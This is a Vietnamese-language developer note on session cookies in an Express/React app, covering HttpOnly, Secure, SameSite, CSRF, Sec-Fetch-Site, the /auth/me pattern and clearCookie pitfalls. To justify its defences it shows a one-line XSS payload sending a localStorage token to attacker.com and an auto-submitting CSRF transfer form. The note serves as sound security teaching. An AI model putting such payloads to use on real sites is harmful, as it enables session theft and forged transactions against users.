# 08 — Cookie

Session token đi tới client bằng cookie, không phải trong response body.
File này giải thích vì sao, mỗi flag chặn kiểu tấn công nào, và vì sao
phải có endpoint `/auth/me`.

---

## Vì sao cookie chứ không phải `localStorage`

Nếu để token trong response body thì **JavaScript của client phải tự lưu** —
thực tế chỉ có `localStorage`, `sessionStorage`, hoặc biến trong memory.

**Vấn đề: `localStorage` đọc được bằng JavaScript.** Nếu trang dính XSS —
một script lạ chạy được, dù chỉ qua một thư viện npm bị nhiễm hay một đoạn
user input không escape — thì:

```js
fetch('https://attacker.com?t=' + localStorage.getItem('token'))
```

Toàn bộ session bay đi trong một dòng. Kẻ tấn công mạo danh user cho tới
khi token hết hạn, và mày không biết gì.

**Cookie `HttpOnly`:** trình duyệt lưu và tự gửi kèm mọi request, nhưng
**JavaScript không đọc được**. XSS chạy được code vẫn không lấy được token
ra ngoài.

**Đánh đổi ngược nhau:**

|                | XSS             | CSRF                       |
| -------------- | --------------- | -------------------------- |
| `localStorage` | phơi hoàn toàn  | miễn nhiễm (không tự gửi)  |
| Cookie         | `HttpOnly` chặn | mở ra — cần `SameSite` bịt |

Không cái nào an toàn tuyệt đối. Cookie + `HttpOnly` + `SameSite=Lax` là tổ
hợp được khuyến nghị vì **XSS nguy hiểm hơn CSRF, và CSRF có cách bịt sạch
hơn**.

**Lưu ý về `HttpOnly`:** nó không chặn XSS. Kẻ tấn công vẫn chạy được code,
vẫn gọi API thay mặt user (vì trình duyệt tự đính cookie). Nó chỉ chặn việc
**mang token ra ngoài** để dùng lâu dài ở nơi khác.

---

## Bốn flag

```ts
const COOKIE_OPTS = {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax' as const,
  path: '/',
}

res.cookie('session', token, {
  ...COOKIE_OPTS,
  maxAge: SESSION_TTL_SECONDS * 1000,
})
```

**`httpOnly`** — JS không đọc được. `document.cookie` không thấy nó.
Không phải mã hóa hay giấu ở đâu bí ẩn — chỉ là một cờ mà trình duyệt tôn
trọng bằng cách từ chối đưa ra.

Kiểm chứng: DevTools → Application → Cookies thấy cookie có cột `HttpOnly`
tick, nhưng gõ `document.cookie` trong Console thì không có nó.

**`secure`** — chỉ gửi qua HTTPS. Không có flag này, user vào wifi quán cà
phê và gõ `http://` một lần là token bay qua mạng dưới dạng plaintext.
Local dev phải tắt vì `localhost` chạy HTTP.

**`sameSite`** — xem mục riêng bên dưới.

**`maxAge`** — thời gian sống, tính bằng **mili giây** trong Express. Nên
đặt khớp với `expires_at` trong DB. Không có nó thì cookie mất khi đóng
trình duyệt.

Express tự thêm cả `Expires` bên cạnh `Max-Age` để tương thích trình duyệt
cũ. Trình duyệt hiện đại ưu tiên `Max-Age`.

**Header thực tế gửi về:**

```
Set-Cookie: session=IRCX4DL-nGcJ...; Max-Age=604800; Path=/;
            Expires=...; HttpOnly; SameSite=Lax
```

---

## Flag đi một chiều

Đây là chỗ dễ hiểu nhầm:

```
server → browser:  Set-Cookie: session=abc; HttpOnly; SameSite=Lax; Max-Age=...
browser → server:  Cookie: session=abc
```

Chiều lên **chỉ có tên và giá trị**. Không `HttpOnly`, không `SameSite`,
không `Max-Age`.

Mấy flag đó là **chỉ thị cho trình duyệt về cách quản lý cookie**, không
phải dữ liệu về cookie. Server không nhận lại — nó đâu cần, chính nó đã
đặt ra.

---

## CSRF

**Cross-Site Request Forgery.** Kẻ tấn công **không đọc được** cookie của
mày, nhưng hắn khiến trình duyệt mày gửi request — và trình duyệt tự đính
cookie vào.

Hắn không lấy trộm chìa khóa, hắn lừa mày mở cửa hộ.

**Kịch bản:**

1. Mày đang đăng nhập `bank.com`, cookie session nằm trong trình duyệt
2. Mày mở `funny-cats.com` (do kẻ tấn công dựng, hoặc bị chèn quảng cáo độc)
3. Trang đó chứa:

```html
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="1000" />
</form>
<script>
  document.forms[0].submit()
</script>
```

4. Trình duyệt gửi POST tới `bank.com`. Vì **cookie được gửi theo domain
   đích**, không phải theo nơi khởi phát, nên cookie session đi kèm
5. `bank.com` thấy cookie hợp lệ → tưởng là mày → chuyển tiền

Mày không bấm gì cả.

**Điểm khiến nó khó nhận ra:** kẻ tấn công **không đọc được response** —
Same-Origin Policy chặn. Nên hắn không lấy được thông tin. Nhưng hắn không
cần: hắn chỉ cần **hành động được thực hiện**.

Vì vậy CSRF nguy hiểm với thao tác **thay đổi dữ liệu**: chuyển tiền, đổi
email, đổi mật khẩu, xóa tài khoản. Không nguy hiểm với việc đọc.

**Cách bịt cổ điển (trước `SameSite`): CSRF token.** Server nhúng một chuỗi
ngẫu nhiên vào form, yêu cầu client gửi lại trong body. Kẻ tấn công không
đọc được HTML của `bank.com` (Same-Origin Policy) nên không biết chuỗi đó.
Vẫn dùng làm lớp phòng thủ thứ hai — đúng tinh thần `defense in depth`.

---

## `SameSite`

Điều khiển: **khi request tới site của mày được khởi phát từ một site khác,
cookie có được gửi kèm không?**

### "Originating" nghĩa là gì

Là **ngữ cảnh (document) đã gây ra request**, không phải URL đích.

Bấm link trong Gmail sang `app.com/dashboard`: trang hiện tại là Gmail,
request được khởi phát từ Gmail. App của mày lúc đó **chưa được load** — nó
là đích đến, không phải nơi khởi phát.

Trình duyệt phân biệt:

- **Target** — request đi tới đâu
- **Initiator** — được khởi phát từ ngữ cảnh nào

`SameSite` so sánh hai cái này.

### Ba giá trị

- **`strict`** — chỉ đính cookie khi **cùng site** (hoặc không có nguồn nào)
- **`lax`** — như strict, cộng **một ngoại lệ**: cross-site nhưng là điều
  hướng top-level bằng **GET**
- **`none`** — luôn đính, **bắt buộc** kèm `Secure`

### Bảng tình huống

| Sec-Fetch-Site | Mode       | Tình huống           | `strict` | `lax` |
| -------------- | ---------- | -------------------- | -------- | ----- |
| `none`         | `navigate` | Gõ URL, bookmark     | ✓        | ✓     |
| `cross-site`   | `navigate` | Bấm link từ Gmail    | ✗        | ✓     |
| `cross-site`   | `cors`     | `fetch` từ site khác | ✗        | ✗     |
| `same-origin`  | `cors`     | `fetch` từ chính app | ✓        | ✓     |

**Dòng 2** là chỗ `lax` khác `strict` — user bấm link từ email vào app vẫn
giữ đăng nhập. `strict` thì bị coi như người lạ, phải login lại mỗi lần vào
từ email/Slack/Facebook.

**Dòng 3** là kịch bản CSRF — cả hai đều chặn.

Nói gọn: **`lax` cho phép đọc cross-site, chặn ghi cross-site.** Vì tấn
công CSRF cần POST để thay đổi dữ liệu. Đó là điểm cân bằng khiến nó thành
mặc định của trình duyệt từ ~2020.

**Sau khi trang đã load thì sao?** Mọi `fetch` từ JS của app có initiator là
chính app → same-origin → cookie luôn được đính, bất kể `lax` hay `strict`.
Nên `SameSite` chỉ ảnh hưởng tới **lần đi vào từ bên ngoài**.

### Site ≠ origin

`SameSite` so theo **site** (registrable domain + scheme), **không** phải
origin (scheme + host + **port**).

- `localhost:3000` vs `localhost:5173` → khác origin, **cùng site**
- `app.example.com` vs `api.example.com` → khác subdomain, **cùng site**
- `app.com` vs `api.other.com` → khác site

Nên FE và BE khác port lúc dev: cần `credentials: 'include'` và CORS (chuyện
của origin), nhưng `sameSite: 'lax'` vẫn hoạt động bình thường. Chỉ khác
domain thật mới phải dùng `sameSite: 'none'`.

---

## Quan sát bằng `Sec-Fetch-Site`

Trình duyệt tự gửi header ghi thẳng kết luận của nó:

```
Sec-Fetch-Site: none          ← gõ URL / bookmark
Sec-Fetch-Site: same-origin   ← fetch từ chính app
Sec-Fetch-Site: same-site     ← từ subdomain khác cùng site
Sec-Fetch-Site: cross-site    ← từ Gmail, site khác
```

```ts
console.log(req.headers['sec-fetch-site'], req.headers['sec-fetch-mode'])
```

**`Sec-Fetch-Mode`:**

- `navigate` — điều hướng cả trang (gõ URL, bấm link, submit form)
- `cors` — `fetch`/`XHR` (kể cả same-origin — vì `mode: 'cors'` là mặc định
  của `fetch`)
- `no-cors` — tài nguyên con nhúng không khai `crossorigin` (`<img>`,
  `<script>`, `<iframe>`)
- `same-origin` — khi ép `fetch(url, { mode: 'same-origin' })`

**Vì sao header này đáng tin hơn `document.referrer`:** nó là kết luận nội
bộ của trình duyệt, là forbidden header — JS không set được, không sửa
được. Và nó không tiết lộ URL nguồn (chỉ nói quan hệ) nên không xung đột
với quyền riêng tư.

`document.referrer` thì bị `rel="noreferrer"`, `Referrer-Policy`,
HTTPS→HTTP, và lớp redirect của webmail cắt mất. Nhưng **`SameSite` không
dùng referrer** — hai cơ chế hoàn toàn tách biệt.

**REST Client không gửi `Sec-Fetch-*`** — nó không phải trình duyệt, không
có ngữ cảnh khởi phát. Cùng lý do với `curl`, Postman. Hệ quả: **CSRF và
`SameSite` không test được bằng REST Client** — nó gửi cookie bất kể
`lax` hay `strict`.

Muốn quan sát thật thì cần trình duyệt: gõ URL thẳng (`none`), bấm link từ
một trang khác site (`cross-site` + `navigate`), chạy `fetch` trong Console
của app (`same-origin` + `cors`).

---

## Cookie jar

Trình duyệt lưu cookie trong **cookie jar** — một SQLite trong thư mục
profile (Chrome: file tên `Cookies`, mã hóa ở tầng OS). Không phải
`localStorage`, không phải memory tạm; nó nằm trên đĩa và sống qua cả lần
đóng/mở trình duyệt (nếu có `Max-Age`).

**Client không phải làm gì cả.** `res.cookie(...)` chỉ thêm header
`Set-Cookie`; trình duyệt thấy header đó thì tự lưu, rồi tự đính vào mọi
request sau tới cùng domain. Không cần code nào.

Đối lập hoàn toàn với `localStorage`: ở đó phải tự lưu, tự đọc, tự set
header `Authorization` mỗi lần gọi API.

**Trình duyệt kiểm tra gì trước khi đính cookie:**

- **Domain** khớp
- **Path** khớp (`Path=/api` thì không gửi cho `/health`)
- Chưa hết hạn
- **`Secure`** — có flag mà request đi qua HTTP thuần thì không gửi
- **`SameSite`** — theo quy tắc ở trên

Tất cả đều là trình duyệt tự quyết, JS không tham gia.

**Nếu FE khác origin với BE** (FE `localhost:5173`, API `localhost:3000`):
`fetch` **không** gửi cookie theo mặc định. Phải:

- FE: `fetch(url, { credentials: 'include' })`
- BE: CORS set `Access-Control-Allow-Credentials: true` và
  `Access-Control-Allow-Origin` phải là origin cụ thể (**không** được `*`
  khi có credentials)

Đây là nguồn gốc của rất nhiều buổi debug "sao đăng nhập rồi mà vẫn 401".

---

## Vì sao cần `/auth/me`

Cookie `HttpOnly` nghĩa là **JavaScript mù hoàn toàn** — không đọc được
cookie, không biết có session hay không, không biết mình là ai.

Sau khi F5: trình duyệt **có** cookie, nhưng React state trắng trơn.

Nên React phải hỏi server: _"tao là ai?"_

```tsx
useEffect(() => {
  fetch('/auth/me') // cookie tự đính vào đây
    .then((r) => (r.ok ? r.json() : null))
    .then((data) => setUser(data?.user ?? null))
    .finally(() => setLoading(false))
}, [])
```

Trình duyệt chỉ tự động làm hai việc: lưu cookie khi thấy `Set-Cookie`, và
đính cookie vào request. Nó **không** tự hỏi "user này là ai" — việc đó là
của app.

**Cookie giữ bằng chứng danh tính; `/auth/me` là cách JS hỏi xem bằng chứng
đó nói gì**, vì nó không tự đọc được.

Điều này đúng bất kể FE và BE cùng hay khác origin. Chuyện cùng/khác origin
chỉ ảnh hưởng tới việc **cookie có được gửi kèm hay không**, không ảnh
hưởng tới việc có cần `/auth/me` hay không.

Sau khi login thành công thì `/login` đã trả user rồi nên không cần gọi
`/auth/me` ngay. Nó chủ yếu dùng cho **lần tải lại trang**.

---

## `clearCookie` — HTTP không có lệnh xóa cookie

`res.clearCookie('session')` thực ra gửi một `Set-Cookie` bình thường với
giá trị rỗng và thời hạn trong quá khứ:

```
Set-Cookie: session=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT
```

Trình duyệt ghi đè cookie cũ bằng cookie này, thấy nó đã hết hạn từ 1970 →
tự dọn ngay.

**Vì sao options phải khớp lúc set:** cookie được định danh bằng
**(name, domain, path)**. Set `path=/api` mà clear không truyền `path` thì
đó là **hai cookie khác nhau** — mày vừa tạo một cookie rỗng ở `/` rồi xóa
chính nó, còn cookie thật ở `/api` nằm nguyên.

Lỗi này không có thông báo gì: response 204, FE chuyển về màn hình login,
mọi thứ trông đúng — nhưng cookie còn sống.

Cách tránh: khai một object `COOKIE_OPTS` dùng chung cho cả `res.cookie` và
`res.clearCookie`. `maxAge` tách riêng vì chỉ set mới cần — **thứ mô tả
_cookie nào_ thì dùng chung, thứ mô tả _sống bao lâu_ thì không**.

### Vì sao HTTP không có lệnh delete

- **Cookie ra đời tối giản** (Netscape 1994, spec vài trang). Cookie vốn đã
  có khái niệm hết hạn, nên xóa chỉ là trường hợp đặc biệt của việc đặt hạn.
- **Trình duyệt phải tự dọn cookie hết hạn rồi** — logic đó đã tồn tại,
  `Expires` trong quá khứ chỉ kích hoạt nó ngay.
- **Server không sở hữu cookie jar.** Cookie nằm trên máy user, thuộc quyền user — Set-Cookie là đề nghị, và trình duyệt là bên quyết định cuối cùng: nó chặn được, rút ngắn hạn được, xóa được, và thực tế các trình duyệt hiện đại đều làm những việc đó vì quyền riêng tư. Một lệnh Delete-Cookie riêng cũng chẳng có thẩm quyền gì hơn Set-Cookie với hạn quá khứ — nên thêm nó vào giao thức không giải quyết được gì.

Cùng khuôn này ở nhiều chỗ trong HTTP: không có "invalidate cache", chỉ có
`Cache-Control: max-age=0`. Server mô tả trạng thái mong muốn, client tự
đối chiếu và hành động.

---

## Vì sao `localStorage` từng phổ biến

`HttpOnly` có từ **2002** (IE6 SP1), chuẩn hóa trong RFC 6265 năm 2011 —
trước cả jQuery. Nên nó không mới.

`localStorage` phổ biến vì chuỗi lý do khác:

1. **Làn sóng SPA + API tách rời (2013-2018)** — cookie cross-domain thời
   đó rất phiền, CORS với credentials rối, `SameSite` chưa tồn tại.
   `localStorage` + `Authorization: Bearer` chạy ngay.
2. **JWT thành mốt** — hầu hết tutorial JWT đều dạy lưu vào `localStorage`.
3. **Mobile app dùng chung API** — app native không có cookie theo cách
   trình duyệt hiểu, nên team chọn Bearer token cho thống nhất.
4. **Hiểu nhầm** — "cookie dính CSRF, localStorage thì không", bỏ qua vế
   `localStorage` phơi trước XSS.

**Điều gì đã đổi:** `SameSite=Lax` thành mặc định từ ~2020, gần như xóa sổ
CSRF cơ bản. Khuyến nghị quay ngược lại cookie `HttpOnly`.

**Đánh giá công bằng:** với mobile app, extension, hoặc kiến trúc FE/BE
tách rời hoàn toàn về tổ chức, Bearer token vẫn hợp lý. Nhưng với web app
thông thường thì cookie `HttpOnly` là mặc định tốt hơn.

Ví dụ hay về chuyện best practice trong web đổi theo thời gian: bài blog
2017 có thể đã lỗi thời, không phải vì nó sai lúc đó, mà vì bối cảnh đã khác.

---

## Chi tiết dễ sót

**`res.cookie` trước `res.json`.** `res.cookie` chỉ soạn header, `res.json`
mới gửi. Ngược lại thì `ERR_HTTP_HEADERS_SENT`.

**Express không tự parse header `Cookie`** — cần `cookie-parser`:

```ts
app.use(cookieParser())
// rồi: req.cookies.session
```

**`app.set('trust proxy', true)` chỉ bật khi thật sự có reverse proxy.**
`X-Forwarded-For` do client gửi được, nên bật bừa là cho phép giả mạo IP.

---

## Liên quan

- [06 — Login](06-login.md) — nơi cookie được set
- [07 — Session](07-session.md) — token bên trong cookie là gì
- [09 — Logout](09-logout.md) — `clearCookie` chỉ dọn phía client
- [Glossary](glossary.md) — CSRF, XSS, SameSite, Sec-Fetch-Site
- [Pitfalls](pitfalls.md)
